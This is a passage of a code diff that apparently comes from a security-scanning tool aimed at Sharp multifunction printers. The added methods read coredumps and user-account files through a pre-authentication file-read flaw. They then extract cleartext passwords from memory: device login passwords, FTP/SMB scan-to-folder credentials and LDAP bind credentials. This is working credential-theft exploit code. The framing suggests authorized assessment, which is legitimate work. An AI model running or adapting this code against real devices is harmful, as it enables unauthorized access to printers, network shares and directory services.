+                                   evidence.encode("utf-8", errors="replace"))
+            for cred in creds:
+                cred.evidence_path = path
+        return creds
+
+    def _scan_memory(self, target: Target, blob: bytes,
+                     source_file: str) -> List[RecoveredCredential]:
+        """
+        Extract credentials from a decompressed coredump.
+
+        Two passes with deliberately different confidence:
+
+          * A ``ggt_textbox(10003)=`` hit is the verbatim body of a login POST
+            the device processed. The field name is the device's own, so the
+            value is a submitted password, not a guess - reported ``verified``.
+          * Everything else is a ``<something>password=<value>`` match over raw
+            memory. Very likely a credential, not proven to be one, so it is
+            reported ``candidate`` and labelled as such in the findings file.
+        """
+        out: List[RecoveredCredential] = []
+        origin = f"cleartext in {source_file} read through the pre-auth LFI on {target.hostport}"
+
+        for match in _MEM_LOGIN_PW_RE.finditer(blob):
+            password = unquote_plus(match.group(1).decode("ascii", errors="replace"))
+            if not _looks_like_password(password):
+                continue
+            # The role travels in the same POST body a few bytes earlier.
+            window = blob[max(0, match.start() - 200):match.start()]
+            role = _role_from_post_body(window)
+            user_match = _MEM_LOGIN_USER_RE.search(window)
+            username = (unquote_plus(user_match.group(1).decode("ascii", errors="replace"))
+                        if user_match else role)
+            out.append(RecoveredCredential(
+                kind="device account",
+                scope=target.hostport,
+                username=username or "(unknown account)",
+                password=password,
+                source=f"login form POST body recovered {origin}",
+                detail=f"matched {PASSWORD_FIELD}= at offset 0x{match.start():x}"
+                       + (f"; role selection {role}" if role else ""),
+                confidence="verified",
+            ))
+
+        for match in _MEM_KV_PW_RE.finditer(blob):
+            key = match.group(1).decode("ascii", errors="replace").lower()
+            password = unquote_plus(match.group(2).decode("ascii", errors="replace"))
+            if not _looks_like_password(password):
+                continue
+            if key.startswith(("ftp", "smb", "netfolder", "desktop")):
+                kind, scope = "scan-to-folder", _nearest_host(blob, match.start()) or target.hostport
+            elif "ldap" in key or "bind" in key:
+                kind, scope = "LDAP", _nearest_host(blob, match.start(), scheme="ldap") or "(LDAP server)"
+            else:
+                kind, scope = "device account", target.hostport
+            out.append(RecoveredCredential(
+                kind=kind,
+                scope=scope,
+                username=_nearest_username(blob, match.start()),
+                password=password,
+                source=f"'{key}' assignment found {origin}",
+                detail=f"matched at offset 0x{match.start():x}",
+                confidence="candidate",
+            ))
+        return out
+
+    def _read_account_names(self, target: Target, ctx: ScanContext) -> List[str]:
+        """
+        Read the account names out of the device's user database.
+
+        The files are binary with embedded ASCII account names, so this is a
+        strings pass filtered to plausible account names - it is used to
+        annotate the recovered passwords, never to claim a credential on its
+        own.
+        """
+        for path_arg in UACCNT_FILES:
+            raw = self._lfi_read(target, ctx, path_arg, 2 * 1024 * 1024,
+                                 "SHARP UACCNT READ")
+            if not raw:
+                continue
+            names = []
+            for _offset, text in printable_strings(raw, min_len=4):
+                candidate = text.strip()
+                if 4 <= len(candidate) <= 32 and re.fullmatch(r"[A-Za-z][A-Za-z0-9._\- ]+", candidate):
+                    names.append(candidate)
+            if names:
+                # Order-preserving unique, capped: this is an annotation, not a dump.
+                seen, unique = set(), []
+                for name in names:
+                    if name.lower() not in seen:
+                        seen.add(name.lower())
+                        unique.append(name)
+                return unique[:20]
+        return []
 
     def _advisory_pre_auth_memory_corruption(self) -> VulnFinding:
         """
